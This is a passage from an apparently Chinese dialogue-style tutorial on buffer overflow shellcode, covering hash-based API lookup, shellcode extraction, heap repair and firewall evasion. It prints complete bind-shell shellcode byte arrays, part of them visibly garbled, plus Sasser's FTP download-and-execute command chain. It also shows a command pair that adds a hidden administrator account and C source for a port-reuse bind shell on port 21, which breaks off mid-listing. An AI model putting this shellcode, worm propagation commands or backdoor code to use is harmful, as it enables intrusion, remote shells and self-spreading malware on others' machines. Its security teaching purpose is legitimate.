“此时，就只能用 PEB 来获得 kerner32 的基址了。”老师有点遗憾的说。“然后再获得函数的地址。”

老师说道，“除了先获取 GetProcAddress 函数地址，再通过 GetProcAddress 函数获取其他函数的地址外。还有一种改进的查找方法，就是直接通过引出表把所有函数的地址都找出来。”

# 6.1.6 HASH 法查找所函数地址

### 6.1.6 HASH 法查找所函数地址

“刚才我们用了多种方法，都是先找到 GetProcAddress 函数的地址，然后通过它找到其他函数的地址。”

“但大家想过没有，既然我们可以获得 GetProcAddress 函数的地址，那当然可用同样的方法获得所有函数的地址啊！”老师问道。

“哦！是啊！GetProcAddress 从 Kernel32.dll 的输出表中搜索；那 send 那些套接字函数从 Ws2_32.dll 的输出表中搜索就 OK 了！”宇强说道。

“哦，是啊，这样也挺方便的！”其他同学也说。

“嗯，而且我们可以在比较函数时再加入 HASH 的思想，缩短查找的代码。”

小知识：HASH

直接音译为“哈希”，也叫做 “散列”。就是把任意长度的输入，通过散列算法变换成固定长度的输出，该输出就是散列值。这种转换是一种压缩映射，散列值的空间通常远小于输入的空间，不同的输入可能会散列成相同的输出，而不可能从散列值来唯一确定输入值。

其数学表述为： h = H(M) 。其中，‘H( )’表示单向散列函数；‘M’表示任意长度明文；‘h’表示固定长度散列值。‘H()’第一要满足单向性，第二是抗冲突性，第三是映射分布均匀性和差分分布均匀性，而 MD5 和 SHA1 可以说是目前应用最广泛的 Hash 算法。

“我们在查找函数名时，不必用真正的函数名来比较，可以设计一个 HASH，只要保证所有函数的 HASH 值不同，那么我们就可用 HASH 值来代替函数名进行查找。”

“哦！使用 HASH 值比用名称有什么好处呢？”PLMM 问道。

“HASH 值是定长的，我们可把 HASH 值放在一个如 EAX 寄存器中，直接进行比较，不用考虑函数名称的长度不同了。”

“哦，是这样啊！”

“好，我们再看一个通过 HASH 法查找所有函数地址再调用的例子。下面是一个别人设计的公式：”

字符[0]循环右移 13 位＋字符[1]) 循环右移 13 位……+最后一个字符

“通过这个 HASH 公式，可得到一些函数名的 HASH 值，如下：”

LoadLibraryA 的 HASH 值是 EC0E4E8E

CreateProcessA 的 HASH 值是 16B3FE72

WSAStartup 的 HASH 值是 3BFCEDCB

WSASocketA 的 HASH 值是 ADF509D9

bind 的 HASH 值是 C7701AA4

listen 的 HASH 值是 E92EADA4

accept 的 HASH 值是 498649E5

closesocket 的 HASH 值是 79C679E7

“根据这种思路，我们得到 BinduseHASH.cpp（光盘有收录）。”

```
unsigned char jeno_bindport19800_sc[] =
    "\xEB\x10\x5B\x4B\x33\xC9\x66\xB9\xd9\x01\x80\x34\x0B\x99\xE2\xFA"
    "\xEB\x05\xE8\xEB\xFF\xFF\xFF\x18\x75\x19\x99\x99\x99\x12\x6D\x71"
    "\xD5\x98\x99\x99\x10\x9F\x66\xAF\xF1\x17\xD7\x97\x75\x71\xFF\x98"
    "\x99\x99\x10\xDF\x91\x66\xAF\xF1\x34\x40\x9C\x57\x71\xCE\x98\x99"
    "\x99\x10\xDF\x95\xF1\xF5\xF5\x99\x99\xF1\xAA\xAB\xB7\xFD\xF1\xEE"
    "\xEA\xAB\xC6\xCD\x66\xCF\x91\x10\xDF\x9D\x66\xAF\xF1\xEB\x67\x2A"
    "\x8F\x71\xAB\x98\x99\x99\x10\xDF\x89\x66\xAF\xF1\xE7\x41\x7B\xEA"
    "\x71\xBA\x98\x99\x99\x10\xDF\x8D\x66\xEF\x9D\xF1\x52\x74\x65\xA2"
    "\x71\x8A\x98\x99\x99\x10\xDF\x81\x66\xEF\x9D\xF1\x40\x90\x6C\x34"
    "\x71\x9A\x98\x99\x99\x10\xDF\x85\x66\xEF\x9D\xF1\x3D\x83\xE9\x5E"
    "\x71\x6A\x99\x99\x99\x10\xDF\xB9\x66\xEF\x9D\xF1\x3D\x34\xB7\x70"
    "\x71\x7A\x99\x99\x99\x10\xDF\xBD\x66\xEF\x9D\xF1\x7C\xD0\x1F\xD0"
    "\x71\x4A\x99\x99\x99\x10\xDF\xB1\x66\xEF\x9D\xF1\x7E\xE0\x5F\xE0"
    "\x71\x5A\x99\x99\x99\x10\xDF\xB5\xAA\x66\x18\x75\x09\x98\x99\x99"
    "\xCD\xF1\x98\x98\x99\x99\x66\xCF\x81\xC9\xC9\xC9\xC9\xD9\xC9\xD9"
    "\xC9\x66\xCF\x85\x12\x41\xCE\xCE\xF1\x9B\x99\xd4\xc1\x12\x55\xF3"
    "\x8F\xC8\xCA\x66\xCF\xB9\xCE\xCA\x66\xCF\xBD\xCE\xC8\xCA\x66\xCF"
    "\xB1\x12\x49\xF1\xFC\xE1\xFC\x99\xF1\xFA\xF4\xFD\xB7\x10\xFF\xA9"
    "\x1A\x75\xCD\x14\xA5\xBD\xAA\x59\xAA\x50\x1A\x58\x8C\x32\x7B\x64"
    "\x5F\xDD\xBD\x89\xDD\x67\xDD\xBD\xA5\x67\xDD\xBD\xA4\x10\xCD\xBD"
    "\xD1\x10\xCD\xBD\xD5\x10\xCD\xBD\xC9\x14\xDD\xBD\x89\xCD\xC9\xC8"
    "\xC8\xC8\xD8\xC8\xD0\xC8\xC8\x66\xEF\xA9\xC8\x66\xCF\x89\x12\x55"
    "\xF3\x66\x66\xA8\x66\xCF\x95\x12\x51\xCE\x66\xCF\xB5\x66\xCF\x8D"
    "\xCC\xCF\xFD\x38\xA9\x99\x99\x99\x1C\x59\xE1\x95\x12\xD9\x95\x12"
    "\xE9\x85\x34\x12\xF1\x91\x72\x90\x12\xD9\xAD\x12\x31\x21\x99\x99"
    "\x99\x12\x5C\xC7\xC4\x5B\x9D\x99\xCA\xCC\xCF\xCE\x12\xF5\xBD\x81"
    "\x12\xDC\xA5\x12\xCD\x9C\xE1\x9A\x4C\x12\xD3\x81\x12\xC3\xB9\x9A"
    "\x44\x7A\xAB\xD0\x12\xAD\x12\x9A\x6C\xAA\x66\x65\xAA\x59\x35\xA3"
    "\x5D\xED\x9E\x58\x56\x94\x9A\x61\x72\x6B\xA2\xE5\xBD\x8D\xEC\x78"
    "\x12\xC3\xBD\x9A\x44\xFF\x12\x95\xD2\x12\xC3\x85\x9A\x44\x12\x9D"
    "\x12\x9A\x5C\x72\x9B\xAA\x59\x12\x4C\xC6\xC7\xC4\xC2\x5B\x9D\x99"; 
```

“运行，测试，还是成功！如图 6－11。”

![](img/Q 版缓冲区溢出教程 197466.jpg)

“叮铃铃……”铃声响了。

“这是个经典代码——短小但强大。思路和前面没什么两样，只是加入 HASH 搜索的思想。” 老师说道，“下课了，大家利用查看 ShellCode 功能的两种方法跟踪进去，体会一下吧！”

# 6.2 ShellCode 的高效提取技巧

## 6.2 ShellCode 的高效提取技巧

“刚才那个代码你想清楚了吗？聪明才子！”课间时小倩问宇强。

“唉，别这么说嘛，我会不好意思的！”

小倩：“我倒～”

“我跟踪了一下，那个程序的确就是按照老师讲的思路，先找 Kernel32.dll 的基址，然后用 HASH 值，在相关 dll 的引出表中找每个函数的地址。”

“哦，你还厉害嘛！”

“呵呵！剩下的就没什么了，就是我们一般 ShellCode 的编写方法。具体程序可以看看我整理出来的 BindByHASH.cpp。理解时就像老师说的：关键理解思路！”

“哦，等会儿我看看。”

“上课了！”老师在台上说道，大家赶紧坐好。

“大家觉得通用 ShellCode 怎么样？”

“哇！太厉害了，任何系统版本下都可以使用，这下我们轻松多了。”玉波满意的说。

“呵呵，对大家有帮助就好。”老师笑道。

“通用方法是有了，但是老师，还有更累人的事情啊！还要提取 ShellCode 呢！”玉波再次问道，“这么长的代码，让我们一个个抄，太不厚道了吧？”

大家都笑了，老师说，“好好好……我们看看如何简单的提取 ShellCode 吧！”

# 6.2.1 汇编内存提取

### 6.2.1 汇编内存提取

“还是用一个实际例子吧！”老师说，“我们把刚才那个监听后门的通用汇编代码提取成 ShellCode。”

“好吧！如果那个程序一句句的对应着抄下来会死人的，好多啊！”

“呵呵，今天我们用个简单的方法吧！在内存里直接拷贝！”

“嗯？如何直接拷贝？”

“我们用 VC 嵌入汇编，然后按 F10 进入调试状态，这几步大家都轻车熟路了吧！在真正单步进入我们嵌入的汇编代码时，用前面编写汇编代码时教过的方法调出内存窗口，在内存窗口中输入 eip ，内存窗口就会显示从 eip 开始的数据。”

“而此时从 eip 开始的数据，就是我们想要的 ShellCode 代码，如图 6－12。”

![](img/Q 版缓冲区溢出教程 198337.jpg)

“哦？ShellCode 开始时是 55 83 EC 64，内存窗口里也是 55 83 EC 64，真的一样也！”

“那当然，数据又不会从天上掉下来，都是在内存里面的，”老师说，“接下来，我们就可以从内存窗口里拷贝、粘贴。稍微整理一下，然后把空格替换成‘\x’，就轻松得到 ShellCode 了！”

```
unsigned char ShellCode[] = 
    \x55\x83\xEC\x64\x8B\xEC\x64\xA1\x30\x00\x00\x00\x8B\x40\x0C\x8B
    \x70\x1C\xAD\x8B\x78\x08\x8B\x47\x3C\x8B\x54\x07\x78\x03\xD7\x8B
    \x4A\x18\x8B\x5A\x20\x03\xDF\x49\x8B\x34\x8B\x03\xF7\xB8\x47\x65
    \x74\x50\x39\x06\x75\xF1\xB8\x72\x6F\x63\x41\x39\x46\x04\x75\xE7
    \x8B\x5A\x24\x03\xDF\x66\x8B\x0C\x4B\x8B\x5A\x1C\x03\xDF\x8B\x04
    \x8B\x03\xC7\x89\x45\x4C\x6A\x00\x68\x61\x72\x79\x41\x68\x4C\x69
    \x62\x72\x68\x4C\x6F\x61\x64\x54\x57\xFF\x55\x4C\x89\x45\x50\x68
    v70\x65\x00\x00\x68\x74\x65\x50\x69\x68\x43\x72\x65\x61\x54\x57
    \xFF\x55\x4C\x89\x45\x04\x68\x73\x41\x00\x00\x68\x6F\x63\x65\x73
    \x68\x74\x65\x50\x72\x68\x43\x72\x65\x61\x54\x57\xFF\x55\x4C\x89
    \x45\x08\x6A\x65\x68\x64\x50\x69\x70\x68\x4E\x61\x6D\x65\x68\x50
    \x65\x65\x6B\x54\x57\xFF\x55\x4C\x89\x45\x0C\x6A\x65\x68\x65\x46
    \x69\x6C\x68\x57\x72\x69\x74\x54\x57\xFF\x55\x4C\x89\x45\x10\x6A\x\x
    \x00\x68\x46\x69\x6C\x65\x68\x52\x65\x61\x64\x54\x57\xFF\x55\x4C\x\x
    \x89\x45\x14\x68\x65\x73\x73\x00\x68\x50\x72\x6F\x63\x68\x45\x78\x\x
    \x69\x74\x54\x57\xFF\x55\x4C\x89\x45\x18\x68\x33\x32\x00\x00\x68\x\x
    \x57\x73\x32\x5F\x54\xFF\x55\x50\x8B\xF8\x68\x75\x70\x00\x00\x68\x\x
    \x74\x61\x72\x74\x68\x57\x53\x41\x53\x54\x57\xFF\x55\x4C\x89\x45\x\x
    \x1C\x68\x65\x74\x00\x00\x68\x73\x6F\x63\x6B\x54\x57\xFF\x55\x4C\x\x
    \x89\x45\x20\x6A\x00\x68\x62\x69\x6E\x64\x54\x57\xFF\x55\x4C\x89\x\x
    v45\x24\x68\x65\x6E\x00\x00\x68\x6C\x69\x73\x74\x54\x57\xFF\x55\x\x
    \x4C\x89\x45\x28\x68\x70\x74\x00\x00\x68\x61\x63\x63\x65\x54\x57\x\x
    \xFF\x55\x4C\x89\x45\x2C\x6A\x00\x68\x73\x65\x6E\x64\x54\x57\xFF\x\x
    \x55\x4C\x89\x45\x30\x6A\x00\x68\x72\x65\x63\x76\x54\x57\xFF\x55\x\x
    \x4C\x89\x45\x34\xB8\x00\x00\x00\x00\xC6\x45\x38\x00\xC6\x45\x3C\x\x
    \x00\xC6\x45\x40\x00\xC6\x45\x44\x00\xC6\x45\x48\x00\x81\xEC\x90\x\x
    v01\x00\x00\x54\x68\x02\x02\x00\x00\xFF\x55\x1C\x6A\x06\x6A\x01\x\x
    \x6A\x02\xFF\x55\x20\x8B\xD8\x33\xFF\x57\x57\xB8\x02\x00\x03\x3E\x\x
    \x50\x8B\xF4\x6A\x10\x56\x53\xFF\x55\x24\x47\x47\x57\x53\xFF\x55\x\x
    \x28\x6A\x10\x8D\x3C\x24\x57\x56\x53\xFF\x55\x2C\x8B\xD8\x33\xFF\x
    \x47\x57\x33\xFF\x57\x6A\x0C\x8B\xF4\x57\x56\x8D\x45\x3C\x50\x8D\x\x
    \x45\x38\x50\xFF\x55\x04\x57\x56\x8D\x45\x44\x50\x8D\x45\x40\x50\x\x
    \xFF\x55\x04\x81\xEC\x80\x00\x00\x00\x8D\x3C\x24\x33\xC0\x68\x80\x\x
    \x00\x00\x00\x59\xF3\xAB\x8D\x3C\x24\xB8\x01\x01\x00\x00\x89\x47\x\x
    v2C\x8B\x45\x40\x89\x47\x38\x8B\x45\x3C\x89\x47\x3C\x8B\x45\x3C\x
    \x89\x47\x40\xB8\x63\x6D\x64\x00\x89\x47\x64\x8D\x44\x24\x44\x50\x\x
    \x57\x51\x51\x51\x41\x51\x49\x51\x51\x8D\x47\x64\x50\x51\xFF\x55\x\x
    \x08\x81\xEC\x00\x04\x00\x00\x8B\xF4\x33\xC9\x51\x51\x8D\x7D\x48\x\x
    \x57\xB8\x00\x04\x00\x00\x50\x56\x8B\x45\x38\x50\xFF\x55\x0C\x8B\x
    \x07\x85\xC0\x74\x19\x33\xC9\x51\x57\xFF\x37\x56\xFF\x75\x38\xFF\x
    \x55\x14\x33\xC9\x51\xFF\x37\x56\x53\xFF\x55\x30\xEB\xC3\x33\xC9\x\x
    \x51\xB8\x00\x04\x00\x00\x50\x56\x53\xFF\x55\x34\x89\x07\x33\xC9\x
    \x51\x57\xFF\x37\x56\xFF\x75\x44\xFF\x55\x10\xEB\xA4 
```

“用教过的方法测试一下，轻松成功！如图 6－13。”

![](img/Q 版缓冲区溢出教程 201435.jpg)

“哇！这么好的方法都不早说！”同学们叫了起来。“我们以前抄的好辛苦啊！”

“呵呵！我是为了大家好，先真正了解系统流程后，再用提高效率的方法。我们再来看一种方法——从 EXE 文件中提取 ShellCode。”

# 6.2.2 可执行文件提取

### 6.2.2 可执行文件提取

“我们得到汇编的程序并测试成功后，就会生成 EXE 可执行文件。”老师说道，“如果是调试版，会在 Debug 目录下；如果是发表版，会在 Release 目录下。如图 6－14。”

![](img/Q 版缓冲区溢出教程 201640.jpg)

“我们用任意一款 16 进制编辑器打开 EXE 文件。我这里用的是 WinHex（光盘有收录），大家可以看到，EXE 的开始是 4D 5A，就是 MZ 标志；在 C0 那排有一个 PE 标志，如图 6－15。”

![](img/Q 版缓冲区溢出教程 201735.jpg)

“我们在 EXE 文件数据中查找，找到 ShellCode 的开头，如这里是 55 83 EC 64，如图 6－16。”

![](img/Q 版缓冲区溢出教程 201795.jpg)

“找到 ShellCode 的开始数据之后，我们将其复制，粘贴出来，也可轻松完成 ShellCode 的提取了。”

“哦！真是好方法啊。但定位 ShellCode 的开始和结束有点麻烦啊！”

“我们可以加入一些标志，比如连续的几个‘0x90’（即 NOP）来表示 ShellCode 的开始和结束。方法是人想出来的，路是人走出来的。”

“好，我们再来看一个更经典的方法——直接利用 C 语言写程序，然后自动提取打印出 ShellCode 来。”

# 6.2.3 C 语言直接提取

### 6.2.3 C 语言直接提取

“直接用 C 语言来写？”

“嗯，说全部用 C 语言来写，也不太准确。”老师说，“应该说是 ShellCode 部分由汇编和 C 语言混合编程。汇编部分主要是完成动态定位函数地址，而 C 语言部分是完成程序的功能流程。整个程序的本质，就是让编译器为我们生成二进制代码，然后在运行时编码、打印，这样就完成了一个模板。”

“大家联想一下内存提取和可执行文件提取，就会发现这三种提取方法都是类似的——都是直接把二进制代码拷贝出来。”

“哦！”

“给大家解释一下混合编程的结构以及流程思路吧！C 语言直接写 ShellCode 的思路，最早也可从 yuange 文章中见到，而 hume 将其发扬光大。”

“混合编程里有 4 个函数：ShellCodes 函数、DecryptSc 函数、PrintSc 函数和 main 函数。”

“在 ShellCodes 函数里面，生成完成功能的 ShellCode，采用的是汇编和 C 语言混合编程。”老师说道，“首先是汇编部分，就是动态获得每个要使用函数的地址；然后用 C 语言来直接调用函数，完成想要的功能。”

“DecryptSc 函数，是生成解码代码 decode 的部分；”

“PrintSc 函数，是直接把合好的 ShellCode 按 16 进制数的形式打印出来。”

“而 main 函数，就是把各个部分组织起来，以自动化的生成 ShellCode 并打印出来。”

“具体来说，main 函数里面先定义要查找的函数名和所在的模块；然后保存 DecryptSc 函数生成的 decode 部分；再把 ShellCodes 函数生成的代码进行编码，粘贴在 decode 后面；最后调用 PrintSc 函数，把最终完成的 ShellCode 打印出来。其流程如图 6－17。”

![](img/Q 版缓冲区溢出教程 202732.jpg)

“其他几个函数都好理解，关键就是 ShellCodes 函数代码部分的生成。”

“ShellCodes 函数分为两大部分，动态获得函数地址就不说了，我们刚才学了几种方法，都是可以的；而高级语言调用函数的部分，hume 采用的是枚举方法执行。”

“函数名称数组和枚举数组对应，增加 API 时只需在相应的.dll 后增加函数名称项，并同步更新 Enum 的索引。调用 API 时直接使用 API_APINAME; 即可。像这样：”

```
API_MessageBeep;
API_MessageBoxA;
API_ExitProcess; 
```

“由此可见，用 C 语言编写 ShellCode 需要对代码生成及 C 编译器行为有更多的了解。有些地方处理起来也不是很省力，不过一旦模板写成，以后写起来或写复杂的 ShellCode 时，就省力多了。”

“我们来测试一下吧！”大家跃跃欲试。

“程序大家可参看 GetShellCodeByC.cpp（光盘有收录）。注意了，我们需要对工程正确的配置才能达到效果。”老师提醒道，“我们要选择 release 版编译，并去掉优化选项。”

“优化？如何去掉？”

“打开菜单下的‘工程→设置’对话框，在‘C/C++’选项卡下删除‘/02’项，如图 6－18。”

![](img/Q 版缓冲区溢出教程 203318.jpg)

“点 OK，设置完毕。我们运行，就可弹出测试对话框，并且得到打印好的 ShellCode。如图 6－19。”

![](img/Q 版缓冲区溢出教程 203373.jpg)

“哇！好方便啊！”

“是啊！大家下来自己测试一下，对应着改变 API 函数的名称和枚举值，测试完成一下其他的功能。”老师说道。

“好哩！真是太有趣了！”

“大家可要注意整理文档，记下方法。”老师说道，“好记性不如烂笔头，多学多记总有好处的。”

# 6.3 ShellCode 的高级功能

## 6.3 ShellCode 的高级功能

“通用性可以了，提取也方便了。我们现在想给 ShellCode 添加什么功能就可添加什么功能了。哈哈，太爽了！”玉波说道。

“我们还可在 ShellCode 里面监听、嗅探、记录密码呢！”古风说。

“我们可以写一个万能的 ShellCode 啦！”宇强也附和着。

“当然可以，但功能越强，代码就越长。同 ShellCode 需要尽量短小是矛盾的。”老师比喻道，“就如女生们都想瘦，但穿了太多的衣服，就怎么也瘦不下去了。”

“哦！怪不得有‘要风度不要温度’一说啊！”宇强说这句话时转向旁边的小倩。

“啥嘛！认真听课！”

“但有一些功能是 ShellCode 里面应该考虑到的，我们讨论几个常用的技巧吧！”

# 6.3.1 恢复堆链表

### 6.3.1 恢复堆链表

“第一个技巧就是恢复堆链表。”

“我们在堆溢出利用时说过，”老师说道，“需要把堆链表进行恢复，才能运行一些 ShellCode。”

“恢复的思路就是：找到系统中堆结构的开始地方，把覆盖后的堆块还给系统。”

“在这里，我们没有必要详细讲解 Windows 的堆结构了。直接给出恢复堆链表处理代码和解释吧！”

```
//XP edii＋74 是下一堆块管理结构，如果是 Win2000，就是 esi＋0x4C
mov edx, dword ptr[edi+74]
// 把 ebx 赋为 0x18
push 0x18
pop ebx
// 得到 TEB，fs:[18]和 fs:[0]都是指向 TEB 的
mov eax, dword ptr fs:[ebx]
//从 TEB＋0x30 得到 PEB
mov eax, dword ptr[eax+0x30]
// PEB＋0x18 为默认堆地址指针
mov eax, dword ptr[eax+0x18]
//把 TotalFreeSize 的值给堆管理结构的第一部分 size
add al,0x28
mov si, word ptr[eax]
mov word ptr[edx],si
//把堆管理结构第二部分 sizeprevious size 设成 8
inc edx
inc edx
mov byte ptr[edx],0x08
//设置堆管理结构的其他部分
inc edx
mov si, word ptr[edx]
xor word ptr[edx],si
inc edx
inc edx
mov byte ptr[edx],0x14
inc edx
mov si, word ptr[edx]
xor word ptr[edx],si
inc edx
inc edx
// 堆基址+0x178 的地方为 FreeLists 结构
add ax,0x150
// 让 FreeLists[0].Flink 和 FreeLists[0].Blink 都指向堆管理结构
mov dword ptr[eax],edx 
mov dword ptr[eax+4],edx
//让堆管理结构也指向 FreeLists，完成堆的恢复
mov dword ptr[edx],eax
mov dword ptr[edx+4],eax 
```

“至于 Windows 堆结构的讲解，以后有机会我们再讲吧！”老师说道，“现在我们直接拿来用。在一般的 ShellCode 前加上这段代码，就可恢复覆盖掉的堆结构。”

# 6.3.2 TTP 和 FTP 客户端——冲击波/震荡波传播的实现

### 6.3.2 TTP 和 FTP 客户端——冲击波/震荡波传播的实现

“而第二个技巧，就是考虑蠕虫病毒们的传播技巧。”

“Nimda、冲击波以及震荡波蠕虫，都曾给网络带来巨大的破坏，其传播速度之快，除了很多机器系统本身具有漏洞之外，还有个重要的原因：蠕虫具有很强的在网络上自我复制和传输的能力。”

大家都认真的听着。

“我们这里只分析它们的传播方法，不教大家如何写蠕虫病毒！”老师强调说，“让大家知道怎样更好的防范。”

“嗯，知道了，老师接着说吧！”

“Nimda 和冲击波在网络上的自我复制和传输，是利用 TFTP 来实现的；而震荡波，则是进行了改进，用 FTP 实现的。”

“让我们来看看 TFTP 是如何工作的。以下载文件为例，在开始工作时，客户发送一个读请求给服务器，如果请求的文件能被读取，TFTP 服务器就返回一个块编号为 1 的数据分组；TFTP 客户发送一个块编号为 1 的 ACK；TFTP 服务器随后发送块编号为 2 的数据；TFTP 客户发回块编号为 2 的 ACK。重复这个过程，直至这个文件传送完毕。”

小知识：TFTP 是基于 UDP 的，其数据报有四种类型

第一种：客户发出的是读或写请求，含有文件名和模式。操作码是 1 或 2。

第二种：服务器发送的数据，含有块编号和 512 字节的数据。操作码是 3。

第三种：客户发的回应，含有收到的块编号。操作码是 4。

第四种：错误信息，含有差错码和差错信息。操作码是 5。

其类型如图 6－20，我们可据此编写出 TFTP 的服务器。

![](img/Q 版缓冲区溢出教程 205496.jpg)

“好了，说了这么多，在 Windows 中，我们利用现成的 TFTP 服务程序来实现上传和下载文件是很简单的。TFTPD32.exe 是个很好的 TFTP 服务器，由 Ph.Jounin 编写。直接运行 TFTPD32.exe，就可建立一个 TFTP 服务器。可以选择要绑定的 IP 和目录文件夹，其运行界面如图 6－21。”

![](img/Q 版缓冲区溢出教程 205651.jpg)

“而 TFTP 的客户端是 Windows 自带的。在命令行下直接运行 TFTP –i IP Get (Put) FileName 就可在本机执行 TFTP 客户端，以供和服务器传输文件。如图 6－22，在 IP 为 192.168.1.166 的 TFTP 服务器上下载了一个名为 ww.txt 的文件。”

![](img/Q 版缓冲区溢出教程 205794.jpg)

“这招常被黑客使用：他们在自己的主机上建一个 TFTP 服务器，进入别人的主机后，直接输 tftp –i 自己 ip Get (Put) FileName 就可实现文件上传/下载，如下载自己感兴趣的东东，或上传一个木马之类的。”

“然而在 Nimda 和冲击波等病毒中，它们用的是谁的 TFTP 服务器呢？肯定不会是用 TFTPD32 建立的服务器吧！那是谁建的服务器呢？”同学们问道。

“嗯，答案就是：病毒自己！在病毒程序中，自己实现了一个 TFTP 服务器！”

“哦？”

“冲击波运行时，分成了两个线程。”

“其中一个线程功能是：在本机绑定并监听 69 端口，建立一个 TFTP 服务器等待别的机器来连接。如果有其他主机连接这个服务器，则会把 msblast.exe 文件传送过去。”

“另一个就是攻击线程。它向其他主机的 135 端口发送攻击代码——ShellCode，如果其他主机有系统漏洞，就会执行攻击代码。而它的攻击代码是精心构造的，所完成的功能就是执行 TFTP -i ip GET msblast.exe 去下载冲击波程序，下载完毕后并且执行。”

“哦，冲击波的 ShellCode 就只是 TFTP -i ip GET msblast.exe 这句话啊？那和我们的 ShellCode 比起来，差远了也！”古风说道。

“呵呵！是的，通过改 ShellCode 和覆盖地址，可使它的功能更通用、强大。”老师说道，“我们再来看看震荡波，它是通过 FTP 来传播的。”

“FTP 和 TFTP 相比较，功能更加完善，不仅可完成上传和下载文件的功能，还可列出目录，可进行用户名和密码的认证，并且可对文件传送与存储方式进行选择等。在 Windows 下，有许多可以建立 FTP 服务器的软件，比如 Serv_U、WP_FTP 等，还可安装 IIS 服务来建立 FTP 服务器等。”

“震荡波运行时，也是分成了多个线程。其中一个是在本机的 5554 端口上，产生一个小型的 FTP 服务器！震荡波就利用这个服务器来向其他有漏洞的主机发送蠕虫本身文件！”

“接下来，震荡波向其他主机发送攻击代码，如果对方主机有漏洞，则会在 9996 端口绑定一个 Shell，并且会执行以下命令： echo off&echo open [infecting machine's IP] 5554>>cmd.ftp&echo anonymous>>cmd.ftp&echo user&echo bin>>cmd.ftp&echo get [rand]_up.exe>>cmd.ftp&echo bye>>cmd.ftp&echo on&ftp -s:cmd.ftp&[rand]i_up.exe&echo off&del cmd.ftp&echo on ”

“我对上面的命令解释一下。大家知道，‘&’前后的命令在 DOS 下会依次执行。比如 net use ww /add & net localgroup administrators ww /add ，就会先添加一个名为‘ww’的用户，然后再将‘ww’加入管理员组。”

“这里震荡波先使用重定向符号‘>>’向 cmd.ftp 文件中输入：”

```
open [infecting machine's IP] 5554 //连接 5554 端口，即进入小型 FTP 服务器
　　anonymous //用户名，为匿名
　　user //密码
　　bin //二进制模式
　　get [rand]_up //接收震荡波蠕虫的文件！！
　　bye //退出 FTP 服务器 
```

“然后再用经典的：”

```
ftp -s:cmd.ftp //即用 cmd.ftp 内的参数，执行 ftp，完成下载★ 
```

“最后执行震荡波蠕虫文件和删除 cmd.ftp：”

```
[rand]i_up.exe del cmd.ftp★ 
```

“这样，就完成了震荡波从一台主机向另一台主机的传播！”

“哦，原来是这样啊！还是比较简单啊！”

“呵呵，大家经过这半期的学习，应该能轻松写出比他们更好的功能吧？”

“嗯，是啊！原来传说中的冲击波/震荡波病毒也没多了不起啊！”古风自信的说。

“老师，你说他们写冲击波/震荡波干嘛？只是传播一下么？对作者什么用处也没有？”玉波问道。

“他们只是想表达一种表现欲！希望别人佩服自己的能力。”老师说道，“大家可千万不要这样啊！这可是违法国家法律的行为。”

# 6.3.3 突破防火墙

### 6.3.3 突破防火墙

“而第三个技巧，就是考虑如何突破防火墙和一些限制环境了！”

“我们的反连 ShellCode 不是可以起到突破防火墙的作用吗？”玉波问道。如图 6－23。

![](img/Q 版缓冲区溢出教程 207676.jpg)

“是的，但那样需要我们攻击方在公网上，有一个公网的 IP 地址。如果攻击方在内网，那目标机就反连不上来，这种方式就行不通了，如图 6－24。”

![](img/Q 版缓冲区溢出教程 207752.jpg)

“哇！是啊！这种情况下如何突破呢？”宇强也迷糊了。

“呵呵！现在我们既不能从攻击机发起连接，因为会被目标机的防火墙阻断；也不能从目标机发起连接，因为到不了攻击机的内网。”

“啊！岂不是路都堵死了？”小倩说道。

“大家不要在一条路上想死了，要换一个思路。”老师说道。“我们既然可以给远程机器发送攻击代码，那么它们之间应该是连接的！而远程机器间的连接通信一般都是通过 Socket 来完成的。”

“哦！我们利用原来的连接？”宇强叫了出来。

“对，如果我们的 ShellCode 可以找到发送攻击代码的那条通路的 Socket，就可直接使用以前那个连接 Socket，不用再新建端口了！如图－25。”

![](img/Q 版缓冲区溢出教程 208053.jpg)

“哦！很巧妙啊！”台下感叹道。

“另外，服务器总要开些端口，我们也可把 Shell 的端口开在防火墙打开的端口上。”老师说，“通过端口复用来突破防火墙！”

“比如，对方开放了 FTP 服务，那么防火墙就需要打开 21 端口。我们的 ShellCode 就可复用目标机的 21 端口，在对方的 21 端口上绑定一个 Shell；而攻击机通过连接 21 端口来获得 Shell。如图 6－26。”

![](img/Q 版缓冲区溢出教程 208239.jpg)

“我们来看看复用端口的具体实现吧！程序如下：”

```
/*
绑定指定 21 端口，绑定 cmd.exe
*/
#include <winsock2.h>
#include <string.h>
#include <stdio.h>
#include <tchar.h>
#include <process.h>
#include <io.h>
#pragma comment(lib, "ws2_32")
int main(int argc, char **argv) 
{ 
    //启动 winsock
    WSAData wsa; 
    WORD wVersion;
    int ret;
    wVersion = MAKEWORD(2, 0); 
    if(WSAStartup(wVersion, &wsa) != 0)
    { 
        return -1;
    }
    //下面获取本机 IP 地址 
    char szHostName[128];
    char *pszIp;
    HOSTENT *pHost = NULL;
    if(gethostname(szHostName, 128)==0)
    { 
        pHost = gethostbyname(szHostName);
        if(pHost != NULL)
        {
            pszIp = inet_ntoa( *(in_addr*)pHost->h_addr_list[0] ); 
        }
        else 
        {
            printf("get host ip fail!\n");
            return -1;
        }
    }
    else
    {
        printf("can't find host name!\n");
        return -1;
    }
    //创建服务端套接字
    SOCKET ss; 
    if((ss = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == SOCKET_ERROR) 
    { 
        printf("error!socket failed!\n"); 
        return -1; 
    } 
    //设置套接字选项，SO_REUSEADDR 选项就是可以实现端口重绑定的 
    //但如果指定了 SO_EXCLUSIVEADDRUSE，就不会绑定成功
    BOOL val = TRUE;
    if(setsockopt(ss, SOL_SOCKET, SO_REUSEADDR, (char *)&val, sizeof(val)) != 0) 
    { 
        printf("error!setsockopt failed!\n"); 
        return -1; 
    } 
    //重新绑定,这里重新绑定 21 端口
    SOCKADDR_IN saddr;
    saddr.sin_family = AF_INET;
    saddr.sin_addr.s_addr = inet_addr(pszIp);
    saddr.sin_port = htons(21); 
    if(bind(ss, (SOCKADDR *)&saddr, sizeof(saddr)) == SOCKET_ERROR) 
    { 
        ret = GetLastError(); 
        printf("error!bind failed!\n"); 
        return -1; 
    } 
    listen(ss, 2); 
    //等待连接
    SOCKET clientFD;
    SOCKADDR_IN caddr;
    int nCaddrSzie; 
    nCaddrSzie = sizeof(caddr);
    clientFD = accept(ss, (struct sockaddr *)&caddr,&nCaddrSzie); 
    //连接之后，就和双管道后门完全一样了
    char Buff[1024];
    SECURITY_ATTRIBUTES pipeattr1, pipeattr2;
    HANDLE hReadPipe1,hWritePipe1,hReadPipe2,hWritePipe2;
    //建立匿名管道 1
    pipeattr1.nLength = 12; 
